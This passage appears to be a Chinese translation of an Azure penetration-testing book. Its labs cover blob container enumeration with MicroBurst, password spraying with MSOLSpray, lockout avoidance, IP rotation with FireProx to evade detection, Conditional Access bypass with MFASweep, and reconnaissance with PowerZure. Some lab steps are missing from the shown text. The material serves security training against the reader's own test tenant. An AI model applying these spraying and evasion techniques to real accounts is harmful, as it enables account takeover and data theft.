  \        <Content-Type>text/plain</Content-Type>\n        <Content-Encoding/>\n\
  \        <Content-Language/>\n        <Content-MD5>P4Xiwn/SRng174UNmV1J2A==</Content-MD5>\n\
  \        <Cache-Control/>\n        <BlobType>BlockBlob</BlobType>\n        <LeaseStatus>unlocked</LeaseStatus>\n\
  \      </Properties>\n    </Blob>\n  </Blobs>\n  <NextMarker/>\n</EnumerationResults>\n\
  ```\n\n图 3.12 – Azure Blob 容器枚举输出\n\n从未经身份验证的角度来看，如果我们无法立即知道存储帐户中的任何容器，我们该怎么办？我们可以使用自动化工具猜测容器名称，检查它们是否允许容器权限，然后从中列出可用文件。\n\
  \n### 动手实验 – 使用 MicroBurst 识别配置错误的 Blob 容器\n\n在本实验中，我们将使用 MicroBurst 中的 `Invoke-EnumerateAzureBlobs`\
  \ 脚本来访问配置错误的 Azure Blob 存储服务中的数据。以下是本实验需要完成的任务：\n\n- **任务 1：** 使用 `Invoke-EnumerateAzureBlobs`\
  \ MicroBurst 模块，以 `azurepentesting` 为基础名称和内置的排列列表，匿名枚举存储帐户容器。\n- **任务 2：** 定义自定义容器列表，并使用它进一步枚举容器。\n\
  \n让我们开始：\n\n1. 在你的渗透测试虚拟机中，以管理员身份打开 PowerShell 控制台。\n\n2. 使用以下命令将目录路径更改为 MicroBurst\
  \ 目录，并导入 PowerShell 函数：\n\n    ```\n    cd .\\MicroBurst\\\n    Import-Module .\\\
  MicroBurst.psm1\n    ```\n\n    输出如下所示：\n\n    ![](img/4fa338e84e0a590967a142dd798ba4e2_112_0.png)\n\
  \n    图 3.13 – 导入 MicroBurst PowerShell 模块\n\n3. 使用 `Invoke-EnumerateAzureBlobs`\
  \ 函数，以 `azurepentesting` 作为基础词，识别配置了容器访问级别的公共存储帐户：\n\n    ```\n    Invoke-EnumerateAzureBlobs\
  \ -Base azurepentesting\n    ```\n\n6. 使用以下命令读取下载的文件之一的内容。这将在记事本中打开该文件：\n\n    ```\n\
  \    notepad .\\credentials.txt\n    ```\n\n    ![](img/4fa338e84e0a590967a142dd798ba4e2_114_0.png)\n\
  \n    图 3.16 – 访问下载的文件\n\n7. 在我们于步骤 3 中使用的命令里，MicroBurst 使用常见的容器名称（如 private 和 public）枚举了存储帐户。除非在命令中另有指定，否则用于猜测容器名称的名称来自\
  \ MicroBurst 存储库中的 permutations.txt 文件。MicroBurst 用于猜测的完整名称列表可以通过以下命令查看：\n\n   \
  \ ```\n    Get-Content .\\Misc\\permutations.txt\n    ```\n\n8. MicroBurst 还允许我们使用\
  \ Folders 参数指定自定义容器名称。使用以下命令创建自定义容器名称列表。当提示创建新文件时，单击“是”：\n\n    ```\n    notepad\
  \ customcontainer.txt\n    ```\n\n    ![](img/4fa338e84e0a590967a142dd798ba4e2_115_0.png)\n\
  \n    图 3.17 – 创建自定义容器名称列表\n\n9. 将以下名称添加到记事本文件中。保存文件并关闭它：\n\n    ```\n    scripts\n\
  \    templates\n    archive\n    2020\n    2019\n    2018\n    ```\n\n10. 回到 PowerShell\
  \ 控制台，使用以下命令，利用自定义名称列表中的任意名称来枚举潜在的公共容器：\n\n    ```\n    Invoke-EnumerateAzureBlobs\
  \ -Base azurepentesting -Folders .\\customcontainer.txt\n    ```\n\n11. 在这里，你可以看到我们找到了比之前运行命令时更多的公共容器和对象：\n\
  \n    ```\n    PS C:\\temp> invoke-EnumerateAzureBlobs -Base azurepentesting -Folders\
  \ .\\customcontainer.txt\n    Found Storage Account - azurepentesting.blob.core.windows.net\n\
  \n    Found Container - azurepentesting.blob.core.windows.net/archive\n        Public\
  \ File Available: https://azurepentesting.blob.core.windows.net/archive/sensitive_customer_private_information.csv\n\
  \    Found Container - azurepentesting.blob.core.windows.net/2020\n        Public\
  \ File Available: https://azurepentesting.blob.core.windows.net/2020/December/access.log\n\
  \    PS C:\\temp>\n    ```\n\n    图 3.18 – 枚举自定义容器\n\n如你所见，与配置相关的漏洞可能会给 Azure 环境带来严重问题。在本书中，我们将在面向公众的以及“内部”平台配置级别看到多个此类问题的示例。\n\
  \n虽然这只是一个示例，但本书中还会重点介绍其他特定于服务的配置漏洞。接下来，我们将研究一些可能适用于我们面向外部服务的其他漏洞类别。\n\n### 与补丁相关的漏洞\n\
  \n虽然这些问题不太常见，但每周仍然会发布大量新的安全补丁。因此，有许多被遗忘或废弃的服务、应用程序和虚拟机错过了这些补丁。在本书中，我们将重点利用与 Azure\
  \ 配置相关的漏洞，但了解利用与补丁相关问题的基本知识也是有帮助的。\n\n从外部角度来看，我们通常会扫描具有公共 IP 的 Azure 虚拟机，以查找面向 Internet\
  \ 的服务。这些服务通常可以通过网络扫描工具进行指纹识别，以确定承载该服务的软件的具体版本。\n\n一旦确定了软件版本，我们可以使用漏洞扫描器（Nessus、Nexpose\
  \ 等）或一些基本的 Google 搜索技巧来查找这些服务中的潜在漏洞。\n\n由于这不是一本关于网络渗透测试的书，我们建议查阅 Packt 出版的众多渗透测试书籍之一：https://www.packtpub.com/catalogsearch/result/?q=penetration%20testing。\n\
  \n### 与代码相关的漏洞\n\n现有应用程序的“云化”以及对云原生开发的推动，是促使组织进入 Azure 云的部分驱动力。通过将现有或遗留应用程序移植到云环境，许多组织只是把原先应用程序中存在的许多旧漏洞一并带了进来。\n\
  \n虽然迁移到云端有许多好处，但它并不是修复应用程序漏洞的灵丹妙药。一些现有的常见应用程序问题在云环境中实际上会变得更具影响力，因为这些问题可能被利用来提升访问权限。\n\
  \n\n\n\n\n### 查找 Azure 凭据\n\n除了在 Azure 应用程序或服务中寻找漏洞之外，获取 Azure 订阅访问权限的最常见方式是通过猜测、窃取或“找到”的凭据。\n\
  \n#### 猜测 Azure AD 凭据\n\n根据实际测试经验，进入 Azure 租户的最常见方式是使用弱密码或默认密码。尽管多年来我们取得了巨大的技术进步，但用户仍然喜欢使用简单密码，而管理员有时会忘记实施身份安全最佳实践。\n\
  \n成功的密码猜测攻击有三个步骤：\n\n- 1. 获取用户名列表。\n- 2. 获取密码列表。\n- 3. 决定并执行猜测策略。\n\n让我们来看一下。\n\n\
  ##### 获取用户名列表\n\n许多组织对用户名/电子邮件地址有正式的命名约定。一些示例包括 `<firstname>.<lastname>@company.com`\
  \ 和 `<firstname>.<lastname_initial>@company.com`。你可以从公开领域（公司网站、支持渠道、在线员工资料、GitHub\
  \ 等）中的用户电子邮件地址识别公司的用户名格式。\n\n然后，你可以将对此命名约定的了解与在 LinkedIn 等网站上找到的公司用户信息相结合，为一份员工列表构建用户名。你也可以查看与该组织相关的过往泄露事件来获取此信息。\n\
  \n##### 获取密码列表\n\n一旦你有了用户名列表，就需要仔细选择一个密码或密码列表来尝试登录这些账户。最简单的方法是使用一份从先前泄露事件中识别出的常见密码公开列表。以下是来自流行的\
  \ *Have I Been Pwned* 数据集的前 100,000 个密码列表：`http://bit.ly/PwnedPasswordsTop100k`。该列表由英国**国家网络安全中心（NCSC）**发布——这不是原始数据集。网上还有其他常见密码列表，你也可以参考。\n\
  \n你也可以自己制定一个更有针对性的列表来尝试登录这些账户。在制定列表时，请记住，大多数组织会实施某种类型的密码策略，以确保用户只选择中等强度的密码。即使有策略存在，用户也常常会创建刚好能通过策略的密码。这些密码可能易于用户记忆和输入，但容易受到密码猜测攻击。\n\
  \n一个很好的例子是密码 `Winter2020`。它足够长，满足大多数密码长度要求（10 个字符），并且满足大多数密码复杂性要求（使用大写字母、小写字母和数字字符）。它也很符合许多密码期限要求。如果密码设置为每\
  \ 90 天过期，那么这正好符合下一个季节。\n\n##### 决定猜测策略\n\n在渗透测试中，我们可以使用多种策略来猜测密码。你可以使用你拥有的用户名和密码列表执行**暴力破解攻击**、**单密码喷洒攻击**或**定向用户攻击**。\n\
  \n**暴力破解攻击**更针对少量用户，目的是尽可能多地尝试密码。这可以是循环尝试常见密码列表、字典单词或随机生成的密码（*图 3.19*）。\n\n在执行暴力破解攻击时，要注意可能存在锁定策略，如果输入多个错误密码，账户会被临时禁用。一个好的经验法则是，从锁定策略中获取失败尝试次数（如果已知）并减去\
  \ 2。这样可以让受害用户有几次输错密码的机会，而不会触发锁定。例如，如果一个账户在五次失败尝试后被锁定，我们只需要猜测三个密码，然后等待锁定计时器重置。如有疑问，请务必与负责渗透测试范围的人员合作，以确定适当的密码猜测策略：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_120_0.png)\n\n图 3.19 – 暴力破解攻击\n\n**密码喷洒攻击**对许多用户名使用相同的密码（*图\
  \ 3.20*）。这里需要考虑的一点是，将密码猜测尝试分布到多个 IP 地址，以避免被某些安全工具检测到（包括 Microsoft 的 AD 密码保护和身份保护。相关链接可在本章末尾的*进一步阅读*部分找到）。\n\
  \n可以使用诸如 FireProx 之类的工具，通过 AWS API Gateway 服务发起攻击来轮换源 IP 地址。请记住，FireProx 可能违反 AWS\
  \ 可接受使用政策，这可能会给你的 AWS 账户带来问题：\n\n| FireProx 信息 |\n|---|\n| **创建者：** Mike Felch（Twitter：`@ustayready`）\
  \ |\n| **开源或商业：** 开源项目 |\n| **GitHub 仓库：** `https://github.com/ustayready/fireprox`\
  \ |\n| **语言：** Python |\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_121_0.png)\n\
  \n图 3.20 – 密码喷洒攻击\n\n既然我们已经有了猜测密码的方法，接下来让我们了解一些工具，这些工具可用于针对我们自己的测试环境尝试猜测密码。\n\n\
  #### MSOLSpray 简介\n\nMSOLSpray 是一款用于 Microsoft 在线账户（Azure/Office 365）的 PowerShell\
  \ 密码喷洒工具。该工具的优势在于，除了检测有效密码外，它还能提供与账户的多因素认证（MFA）状态相关的有用侦察信息，例如账户是否存在、账户是否被锁定或禁用，或者密码是否已过期。\n\
  \n| MSOLSpray 信息 |\n|---|\n| **创建者：** Beau Bullock（Twitter：@dafthack） |\n| **开源或商业：**\
  \ 开源项目 |\n| **GitHub 仓库：** https://github.com/dafthack/MSOLSpray |\n| **语言：** PowerShell\
  \ |\n\n虽然还有其他变体（MSOLSpray Python、TREVORspray 等），但在下一个动手练习中，我们将使用最初用 PowerShell 编写的\
  \ MSOLSpray 工具。\n\n#### 动手练习 – 使用 MSOLSpray 猜测 Azure Active Directory 凭据\n\n在本动手练习中，我们将使用\
  \ MSOLSpray 工具执行密码喷洒攻击。以下是我们要完成的任务：\n\n- **任务 1**：从 Azure Cloud Shell 在你的 Azure\
  \ Active Directory 租户中创建测试用户。\n- **任务 2**：使用 Azure 门户为测试用户启用 MFA。\n- **任务 3**：在你的渗透测试虚拟机上下载并导入\
  \ MSOLSpray。\n- **任务 4**：在你的渗透测试虚拟机上创建用户列表。\n- **任务 5**：从你的渗透测试虚拟机使用 MSOLSpray 运行密码喷洒攻击。\n\
  \n让我们开始：\n\n- 1. 打开 Web 浏览器，浏览到 Azure 门户 https://portal.azure.com。使用你的 azureadmin\
  \ 凭据登录。\n- 2. 在 Azure 门户中，单击右上角的 Cloud Shell 图标：\n- 3. 如果出现提示，请选择 PowerShell：\n\n\
  ![](img/4fa338e84e0a590967a142dd798ba4e2_122_0.png)\n\n图 3.21 – 打开 Azure Cloud Shell\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_122_1.png)\n\n图 3.22 – 选择 \"PowerShell\"\
  \n\n- 6. 使用以下命令执行下载的脚本。当提示输入密码时，输入 myPassword123 并按 Enter。该脚本将使用你输入的密码在你的 Azure\
  \ AD 租户中预配五个新用户：\n\n```\n./create-test-users.ps1\n```\n\n如下所示：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_124_0.png)\n\
  \n图 3.26 – 为测试用户输入密码\n\n- 7. 在脚本输出的末尾，记下用户主体名称和密码。密码喷洒攻击时需要用到它们：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_124_1.png)\n\
  \n图 3.27 – 记下用户主体名称和密码\n\n- 8. 关闭 Cloud Shell 窗口：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_124_2.png)\n\
  \n图 3.28 – 关闭 Cloud Shell\n\n\n\n\n\n9. 在 Azure 门户中，点击左上角的 Hub 菜单图标并选择 Azure Active\
  \ Directory：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_125_0.png)\n\n图 3.29 –\
  \ 点击“Azure Active Directory”\n\n10. 在 Azure AD 控制台中，在 Manage 部分，选择 Users 并点击 Multi-Factor\
  \ Authentication：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_125_1.png)\n\n图 3.30\
  \ – 点击“Multi-Factor Authentication”\n\n16. 将你之前记下的用户名输出粘贴到 Notepad 中。保存并关闭 Notepad\
  \ 文档：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_128_0.png)\n\n图 3.35 – 粘贴脚本之前创建的用户名\n\
  \n17. 使用以下命令对用户账户运行 MSOLSpray。指定你之前记下的密码输出。你应该会看到所有账户的成功消息，但你也应该会看到你已为其启用 MFA 的账户的输出：\n\
  \n```\nInvoke-MSOLSpray -UserList ./userlist.txt -Password myPassword123\n```\n\n\
  输出如下所示：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_128_1.png)\n\n图 3.36 – 对用户列表执行密码喷洒攻击\n\
  \n18. 在 InPrivate 或 Incognito 窗口中打开 Azure AD 门户 https://aad.portal.azure.com 。使用\
  \ Sandra 的凭据登录：\n\nUsername: `sandra@<domain_name_suffix>`\n\nPassword: myPassword123\n\
  \n19. 你现在应该能够以 Sandra 的身份访问 Azure AD 门户。此外，你还应该能够以 Sandra 的身份查看 Azure AD 租户中其他用户的信息！（这是默认行为。）\n\
  \n图 3.37 – 使用 Sandra 的被攻破账户访问 Azure AD 门户\n\n20. 返回以 azureadmin 用户登录的 Azure Cloud\
  \ Shell。下载清理脚本以删除之前创建的测试用户，并使用以下命令验证下载：\n\n```\nInvoke-WebRequest -Uri http://bit.ly/az-pentest-cleanup-test-users\
  \ -OutFile cleanup-test-users.ps1\n```\n\n```\nGet-ChildItem\n```\n\n输出如下所示：\n\n\
  图 3.38 – 下载清理脚本\n\n此工具将遍历以下 Microsoft 服务，以识别任何允许在没有 MFA 或 Conditional Access 要求的情况下访问的服务：\n\
  \n- Microsoft Graph API\n- Azure Service Management API\n- Microsoft 365 Exchange\
  \ Web Services\n- Microsoft 365 Web portal\n- Microsoft 365 Web portal with mobile\
  \ user agent (Android)\n- Microsoft 365 ActiveSync\n\n在一个真实场景中，我们可能会发现使用移动操作系统的用户对标准\
  \ Conditional Access 规则有例外。为什么会这样？一些移动用户会从不同的 IP 地址频繁登录，很难预测这些 IP。通过使用移动设备用户代理，我们可以假装成移动操作系统，从而绕过\
  \ Conditional Access 要求。\n\n虽然我们在实验室中不会使用它，但将 MFASweep 工具用于你的测试是有益的：\n\n1. 在你的 pentest\
  \ VM 中，打开 PowerShell 控制台，切换目录到你的用户目录，并使用以下命令克隆 MFASweep GitHub 仓库：\n\n```\ncd C:\\\
  Users\\$env:USERNAME\\\ngit clone https://github.com/daftHack/MFASweep.git\n```\n\
  \n2. 使用以下命令导入 MFASweep PowerShell 模块：\n\n```\ncd .\\MFASweep\\\nImport-Module .\\\
  MFASweep.ps1\n```\n\n3. 使用以下命令对你已攻破的任何用户账户运行 MFASweep。你应该会看到允许 Conditional Access\
  \ 策略绕过的任何账户的成功消息：\n\n```\nInvoke-MFASweep -Username sandra@azurepentesting.com -Password\
  \ myPassword123\n```\n\n虽然 Conditional Access 策略绕过可能并非在任何地方都可用，但还有额外的 *非传统* 选项可用于绕过\
  \ MFA 要求。\n\n### Summary\n\n在本章中，我们介绍了从外部人员角度处理 Azure pentest 场景的方法，该人员对目标的云资产几乎没有信息。我们还学习了如何查找暴露资源的配置错误漏洞，这可能导致对租户的初始访问。\n\
  \n除此之外，我们还介绍了用于攻破 Azure AD 用户账户以供进一步利用的一系列工具和技术。本章讨论的信息有望使你能够匿名发现和攻击公共 Azure 资源和易受攻击的云身份。\n\
  \n在下一章中，我们将介绍在你猜测到凭据或获得对订阅的 *reader* 级别访问权限后可以进行的攻击。\n\n#### Further reading\n\n\
  要了解本章所涵盖内容的更多信息，请查看以下资源：\n\n- Azure AD Identity Protection: `https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/overview-identity-protection`\n\
  - Azure AD Password Protection: `https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-password-ban-bad`\n\
  - Social engineering: `https://www.csoonline.com/article/2124681/what-is-social-engineering.html`\n\
  - *Implementing Microsoft Azure Security Technologies* by David Okeyode, Packt Publishing\n"
- '## Section 2: Authenticated Access to Azure


  本书的第二部分将介绍在 Azure 环境中经过身份验证的用户可用的核心攻击。它们将按每个攻击所需的一般订阅权限（Reader、Contributor、Owner）进行划分。本节还解释了攻击者在获得特权
  Azure AD 账户访问权限后可用的持久化方法。


  本书的这一部分包含以下章节：


  - *Chapter 4, Exploiting Reader Permissions*

  - *Chapter 5, Exploiting Contributor Permissions on IaaS Services*

  - *Chapter 6, Exploiting Contributor Permissions on PaaS Services*

  - *Chapter 7, Exploiting Owner and Privileged Azure AD Role Permissions*

  - *Chapter 8, Persisting in Azure Environments*

  '
- "## Exploiting Reader Permissions\n\n虽然 Reader 角色在订阅中的使用不如 Contributor 或 Owner 角色频繁，但它确实允许用户读取服务资源和配置的基本信息。作为进入环境的初始入口点，Reader\
  \ 角色可能允许你读取可用于转向更特权角色的敏感信息。\n\nReader 角色不允许对服务或资源进行任何修改，但它会允许攻击者枚举环境的攻击面。这是经常为在\
  \ Azure 渗透测试期间可能配置的任何 Azure AD 账户发放 Reader 访问权限的驱动原因。\n\n出于充分的理由，许多组织希望避免在渗透测试期间向渗透测试人员授予订阅的变更（Contributor\
  \ 或更高）访问权限。通过发放 Reader 角色账户，测试人员将获得有助于他们识别从匿名角度可能不明显的配置错误的洞察。\n\n当提示输入密码时，输入 `myPassword123`（或你选择的密码）并按\
  \ *Enter*。等待脚本部署完成。部署可能需要大约 8 分钟才能完成：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_140_0.png)\n\
  \n图 4.3 – 设置脚本的示例输出\n\n### What does the script do?\n\n脚本创建一个具有 Reader 权限的 Azure\
  \ 订阅用户账户。脚本还设置了 *Figure 4.4* 中显示的资源和对象：\n\n- 一个容器注册表实例\n- 一台 Ubuntu Linux VM\n-\
  \ 一个 Azure Automation 账户\n- 一个 web app 资源\n- 一个 MySQL 平台数据库\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_140_1.png)\n\
  \n图 4.4 – 脚本创建的资源图\n\n\n\n5. 脚本执行完毕后，本次练习后续所需的关键信息将显示在输出部分。请将信息复制到记事本文档中，以备后用。你需要从输出部分获取两个值：\n\
  \n- **Azure Reader User：** 这是具有 Azure 订阅读取者权限的练习用户名。我们将在下一步为其授予对 Azure AD 的读取者权限。\n\
  - **Azure Reader User Password：** 这是你之前输入的 Azure Reader 用户的密码：\n\n```\nTranscript\
  \ started, output file is reader-account-output.txt\n################\n#### Script\
  \ Output ####\n################\nAzure Reader User: readeruser@azurepentesting.com\n\
  Azure Reader User Password: myPassword123\n\nTranscript stopped, output file is\
  \ /home/azureadmin/reader-account-output.txt\nDeployment Ended 06/03/2021 12:38:15\n\
  PS /home/azureadmin>\n```\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_141_0.png)\n\
  \n6. 返回 Azure 门户（仍以 azureadmin 用户身份进行身份验证），浏览到 **Azure Active Directory**。依次单击 **角色和管理员**，然后选择\
  \ **全局读取者** 角色：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_141_1.png)\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_141_1.png)\n\
  \n7. 在 **全局读取者 | 分配** 边栏中，单击 **添加分配**，选择 **readeruser** 对象，然后点击 **添加**。这将确保 readeruser\
  \ 帐户在 Azure AD 中拥有全局读取者权限，同时拥有订阅的读取者权限：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_142_0.png)\n\
  \n图 4.7 – 将 readeruser 帐户添加为全局读取者\n\n8. 使用 RDP 连接到你的渗透测试虚拟机，并以管理员身份打开 PowerShell。使用以下命令对\
  \ Azure 进行身份验证：\n\n```powershell\nPS C:\\> Connect-AzAccount\n```\n\n9. 当提示进行身份验证时，使用\
  \ **Azure Reader Admin User** 值（来自脚本输出）作为用户名，并使用 **Azure Reader Admin User Password**\
  \ 值（同样来自脚本输出）作为密码：\n\n```powershell\nPS C:\\Users\\pentestadmin> Connect-AzAccount\n\
  \nAccount                              SubscriptionName  TenantId\n-------     \
  \                         ----------------  --------\nreaderuser@azurepentesting.com\
  \       Development       40d5707e-b434-4f10-9d7d-21...\n```\n\n图 4.8 – 以 readeruser\
  \ 帐户成功进行身份验证\n\n3. 从顶部菜单栏选择 **导出到 CSV**。\n4. 下载 CSV，并使用 Excel 按 **类型** 对资源数据进行排序。\n\
  5. 添加一个计数列，并在每一行中填入 1。\n6. 使用 Excel 的“分类汇总”函数（采用以下设置）在类型每次变化时进行计数：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_144_0.png)\n\
  \n图 4.10 – 创建资源类型的分类汇总\n\n7. 这应该会生成一份关于订阅中所有可用资源的简明汇总列表：\n\n| 名称 | 类型 | 资源组 | 位置\
  \ | 订阅 | 计数 |\n|---|---|---|---|---|---:|\n|  | 应用服务计数 |  |  |  | 11 |\n|  | 应用服务计划计数\
  \ |  |  |  | 7 |\n|  | 自动化帐户计数 |  |  |  | 3 |\n|  | 可用性集计数 |  |  |  | 1 |\n|  |\
  \ Azure Cosmos DB 帐户计数 |  |  |  | 1 |\n|  | 认知服务计数 |  |  |  | 1 |\n|  | 容器注册表计数\
  \ |  |  |  | 1 |\n|  | 磁盘计数 |  |  |  | 103 |\n|  | 映像计数 |  |  |  | 4 |\n|  | IoT\
  \ 中心计数 |  |  |  | 1 |\n|  | 密钥保管库计数 |  |  |  | 3 |\n|  | Kubernetes 服务计数 |  |  |\
  \  | 1 |\n|  | Log Analytics 工作区计数 |  |  |  | 2 |\n|  | 网络接口计数 |  |  |  | 107 |\n\
  |  | 网络安全组计数 |  |  |  | 89 |\n|  | 公共 IP 地址计数 |  |  |  | 122 |\n|  | 恢复服务保管库计数 |\
  \  |  |  | 1 |\n|  | 路由表计数 |  |  |  | 1 |\n|  | Runbook 计数 |  |  |  | 15 |\n|  |\
  \ SendGrid 帐户计数 |  |  |  | 2 |\n|  | 快照计数 |  |  |  | 2 |\n|  | 解决方案计数 |  |  |  |\
  \ 5 |\n|  | SQL 数据库计数 |  |  |  | 1 |\n|  | SQL Server 计数 |  |  |  | 2 |\n|  | 存储帐户计数\
  \ |  |  |  | 43 |\n|  | 虚拟机计数 |  |  |  | 24 |\n|  | 虚拟机规模集计数 |  |  |  | 1 |\n| \
  \ | 虚拟网络计数 |  |  |  | 35 |\n|  | 总计 |  |  |  | 589 |\n\n图 4.11 – Azure 资源汇总列表\n\n\
  虽然门户是一个很好的可视化工具，但它并不总是收集配置信息的最有效方法。为此，我们需要使用能够通过脚本和 PowerShell 模块自动收集配置的工具。\n\n\
  ### 介绍 PowerZure\n\nPowerZure 是一个基于 PowerShell 的工具，用于枚举 Azure 中的资源并利用服务中的不安全配置。它由多个内置函数组成，可用于收集有关\
  \ Azure 环境的信息并利用已发现的资源。我们将在本章及后续章节中使用其中的一些函数。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_146_0.png)\n\
  \n接下来，我们将使用 PowerZure 来收集示例订阅的信息。\n\n### 动手练习 – 使用 PowerZure 收集订阅访问信息\n\n在本练习中，我们将在渗透测试虚拟机上下载\
  \ PowerZure，并将其导入到我们的 PowerShell 会话中。本练习将完成以下任务：\n\n- **任务 1：** 下载 PowerZure。\n\
  - **任务 2：** 导入 `PowerZure.ps1` 模块。\n- **任务 3：** 运行 `Get-AzureTargets` 函数查看用户权限。\n\
  - **任务 4：** 查看收集到的信息。\n\n让我们开始：\n\n1. 在渗透测试虚拟机上，在已通过 Az PowerShell 模块进行身份验证的 PowerShell\
  \ 会话中，使用以下命令下载 PowerZure：\n\n```\nPS C:\\> cd C:\\Users\\$env:USERNAME\nPS C:\\\
  > git clone https://github.com/hausec/PowerZure.git\n```\n\n下面是命令及其输出的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_146_1.png)\n\
  \n图 4.12 – 克隆 PowerZure GitHub 仓库\n\n2. 使用以下命令将 PowerZure 模块导入到你的 PowerShell 会话中。如果提示安装\
  \ Azure AD 模块，请键入 Y 并按 *Enter*。关闭并重新打开 PowerShell 控制台：\n\n```powershell\nPS C:\\\
  > cd .\\PowerZure\\\nPS C:\\> Import-Module .\\PowerZure.ps1\n```\n\n其效果如下：\n\n\
  ![](img/4fa338e84e0a590967a142dd798ba4e2_147_0.png)\n\n图 4.13 – PowerZure 模块的初始导入\n\
  \n3. 如果你安装了 Azure AD 模块，请打开一个新的 PowerShell 会话，并使用以下命令将 PowerZure 重新导入到 PowerShell\
  \ 控制台中：\n\n```powershell\nPS C:\\> cd C:\\Users\\$env:USERNAME\\PowerZure\nPS C:\\\
  > Import-Module .\\PowerZure.ps1\n```\n\n模块导入后，它将列出你当前的角色（Reader）和可用的订阅。这是有用的侦察信息：\n\
  \n- **AADRoles：** 显示当前用户在 Azure AD 中被分配的角色。\n- **AzureRoles：** 显示用户的 Azure RBAC\
  \ 角色分配和作用域。\n- **可用订阅：** 显示用户拥有一定权限级别的订阅。此信息有助于判断是否可以使用此用户账号横向移动到其他订阅：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_147_1.png)\n\
  \n图 4.14 – PowerZure 输出示例\n\n这是输出的样子：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_149_0.png)\n\
  \n图 4.16 – PowerZure 输出示例\n\n虽然 PowerZure 的 Get-AzTargets 函数是了解用户访问范围及其可访问资源的绝佳方式，但\
  \ MicroBurst 也会将此信息收集到平面文件中，以便审查整个订阅。每种工具都有各自的优点，不同情况需要不同的工具。\n\n> **重要说明**\n> \n\
  > 值得注意的是，在启用了 Azure Defender 的 Azure 安全中心版本中，对 PowerZure 和 MicroBurst 都有默认检测。如果你的目标是在环境中保持隐蔽，这些自动化工具可能会暴露你的活动。有关可用\
  \ Azure 安全警报的更多信息，请参阅 Microsoft 文档 – `https://docs.microsoft.com/en-us/azure/security-center/alerts-reference`。\n\
  \n\n\n\n\n在下一个练习中，我们将使用 MicroBurst 的一个函数对整个 Azure 环境进行快速且全面的枚举。\n\n### 实践练习 – 使用\
  \ MicroBurst 枚举订阅信息\n\n我们曾在 *第 3 章，查找 Azure 服务和漏洞* 中介绍过 MicroBurst 工具包，用于匿名枚举 Azure\
  \ 服务。在本练习中，我们将使用其一个函数对我们的 Azure 订阅进行经过身份验证的枚举。我们将在本练习中完成的任务如下：\n\n- **任务 1：** 将\
  \ MicroBurst 导入 PowerShell 会话。\n- **任务 2：** 使用 `Get-AzDomainInfo` MicroBurst 函数使用读取者权限枚举订阅。\n\
  - **任务 3：** 查看函数收集的资源清单。\n- **任务 4：** 查看函数收集的用户列表。\n- **任务 5：** 查看用于定位的特权用户列表。\n\
  \n让我们开始：\n\n1. 在你的渗透测试 VM 上的经过身份验证的 Az 模块 PowerShell 会话中，使用以下命令导入 MicroBurst 模块。如果出现关于\
  \ MSOnline 的非致命错误，可以忽略，因为该模块未安装在 VM 上，因为它未被使用：\n\n```powershell\nPS C:\\> cd C:\\\
  Users\\$env:USERNAME\\MicroBurst\nPS C:\\> Import-Module .\\MicroBurst.psm1\n```\n\
  \n2. 使用以下命令创建一个文件夹来存储我们即将运行的函数输出：\n\n```powershell\nPS C:\\> New-Item -Name \"microburst-output\"\
  \ -ItemType \"directory\"\n```\n\n3. 使用以下命令运行 MicroBurst 函数以枚举 Azure 订阅。当显示订阅的窗口打开时，单击\
  \ **OK** 继续：\n\n```powershell\nPS C:\\> Get-AzDomainInfo -Verbose -Folder microburst-output\n\
  ```\n\n以下是其外观的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_151_0.png)\n\n图 4.17\
  \ – MicroBurst 选择订阅的提示\n\n该函数将以 CSV 形式输出枚举结果，文本文件将存储在指定的输出文件夹中。\n\n4. 使用以下命令打开输出文件夹。这将在文件资源管理器中打开\
  \ `microburst-output` 文件夹：\n\n```powershell\nPS C:\\> explorer microburst-output\n\
  ```\n\n你将在打开的视图中看到一个名为 Az 的单个文件夹：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_151_1.png)\n\
  \n图 4.18 – 打开 MicroBurst 输出文件夹\n\n5. 按如下方式查看文件和文件夹的内容。内容包含函数收集的资源清单（你可以使用 Visual\
  \ Studio Code 打开 CSV 文件）：\n\n   - Az -> **<订阅名称>**（在我们的例子中，我们的订阅名为 Development，但对你来说会不同）->\
  \ **PublicIPs.csv**\n   - Az -> **<订阅名称>** -> **Resources**\n   - Az -> **<订阅名称>**\
  \ -> **VirtualMachines**\n\n可以解析这些信息以获取在订阅中配置的外部目标（App Service 应用程序；存储账户；公共 IP 地址和域名）。然后可以使用这些信息来针对托管服务进行漏洞评估或配置错误：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_152_0.png)\n\n6. 按如下方式查看指定文件的内容。内容包含函数收集的用户列表：\n\
  \n**Az -> <订阅名称> -> Users.csv**\n\n可以从此列表中获取用户名、电子邮件地址、账户类型和账户状态等有用信息。这些信息可用于针对凭据猜测或钓鱼攻击，如我们在\
  \ *第 3 章，查找 Azure 服务和漏洞* 中之前演示的那样：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_153_0.png)\n\
  \n图 4.20 – 示例 Users.csv 文件输出\n\n7. 按如下方式查看指定文件夹的内容。内容包含函数收集的特权用户列表：\n\n**Az -> <订阅名称>\
  \ -> RBAC**\n\n这些用户可以被针对以进行凭据窃取攻击从而提升权限。\n\n我们使用的 MicroBurst 函数 – `Get-AzDomainInfo`\
